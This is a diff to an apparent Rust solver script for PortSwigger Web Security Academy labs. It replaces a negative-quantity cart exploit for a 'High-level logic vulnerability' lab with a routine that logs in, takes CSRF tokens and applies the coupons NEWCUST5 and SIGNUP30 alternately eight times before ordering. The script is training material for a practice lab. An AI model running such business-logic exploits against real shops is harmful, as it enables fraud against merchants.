@@ -2,19 +2,17 @@
 *
 * Author: Ahmed Elqalawy (@elqal3awii)
 *
-* Date: 25/10/2023
+* Date: 26/10/2023
 *
-* Lab: High-level logic vulnerability
+* Lab: Flawed enforcement of business rules
 *
-* Steps: 1. Fetch login page
+* Steps: 1. Fetch the login page
 *        2. Extract csrf token and session cookie
 *        3. Login as wiener
 *        4. Add the leather jacket to the cart
-*        5. Add another product to the cart with a negative quantity to make the 
-*           total price positive and less than $100 ( adjust the the quantity based
-*           on the product price )
-*        6. Fetch wiener's cart
-*        7. Extract csrf token needed for placing order
+*        5. Fetch wiener's cart
+*        6. Extract csrf token needed for applying coupons and placing order
+*        7. Apply the coupons one after another repeatedly for a few times
 *        8. Place order
 *        9. Confirm order
 *
@@ -42,7 +40,7 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a49005104155a7681a4e88500f300d0.web-security-academy.net";
+    let url = "https://0ade009e03cacb5e80ef082b00e60071.web-security-academy.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
@@ -92,10 +90,7 @@ fn main() {
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
 
     println!("{}", "OK".green());
-    print!(
-        "{}",
-        "⦗4⦘ Adding the leather jacket to the cart.. ".white(),
-    );
+    print!("{}", "⦗4⦘ Adding the leather jacket to the cart.. ".white(),);
     io::stdout().flush();
 
     // add the leather jacket to the cart
@@ -114,34 +109,7 @@ fn main() {
         ));
 
     println!("{}", "OK".green());
-    print!(
-        "{}",
-        "⦗5⦘ Adding another product to the cart with a negative quantity.. ".white(),
-    );
-    io::stdout().flush();
-
-    /*
-        add another product to the cart with a negative quantity to make the total price 
-        positive and less than $100.
-        adjust the the quantity based on the product price.
-        -13 is suitable for the products priced at approximately $100.
-    */
-    client
-        .post(format!("{url}/cart"))
-        .header("Cookie", format!("session={session}"))
-        .form(&HashMap::from([
-            ("productId", "12"),
-            ("redir", "PRODUCT"),
-            ("quantity", "-13"),
-        ]))
-        .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to add another product to the cart with a negative quantity".red()
-        ));
-
-    println!("{}", "OK".green());
-    print!("{}", "⦗6⦘ Fetching wiener's cart.. ".white(),);
+    print!("{}", "⦗5⦘ Fetching wiener's cart.. ".white(),);
     io::stdout().flush();
 
     // fetch wiener's cart
@@ -154,15 +122,46 @@ fn main() {
     println!("{}", "OK".green());
     print!(
         "{}",
-        "⦗7⦘ Extracting csrf token needed for placing order.. ".white(),
+        "⦗6⦘ Extracting csrf token needed for applying coupons and placing order.. ".white(),
     );
     io::stdout().flush();
 
     // extract csrf token needed for placing order
     csrf = extract_csrf(wiener_cart).expect(&format!(
         "{}",
-        "[!] Failed to extract the csrf token needed for placing order".red()
+        "[!] Failed to extract the csrf token needed for applying coupons and placing order".red()
     ));
+
+    println!("{}", "OK".green());
+
+    // the variable that will hold the current coupone to apply
+    let mut coupon = "";
+
+    // apply the coupons one after another repeatedly for a few times
+    for counter in 1..9 {
+        if counter % 2 != 0 {
+            // apply the first coupon when the counter has an odd value
+            coupon = "NEWCUST5";
+        } else {
+            // apply the second coupon when the counter has an even value
+            coupon = "SIGNUP30";
+        }
+
+        print!(
+            "\r{} {} ({counter}/8).. ",
+            "⦗7⦘ Applying the coupon".white(),
+            coupon.yellow(),
+        );
+        io::stdout().flush();
+
+        // apply the coupon
+        client
+            .post(format!("{url}/cart/coupon"))
+            .header("Cookie", format!("session={session}"))
+            .form(&HashMap::from([("coupon", coupon), ("csrf", &csrf)]))
+            .send()
+            .expect(&format!("{}", "[!] Failed to apply the coupon".red()));
+    }
 
     println!("{}", "OK".green());
     print!("{}", "⦗8⦘ Placing order.. ".white(),);
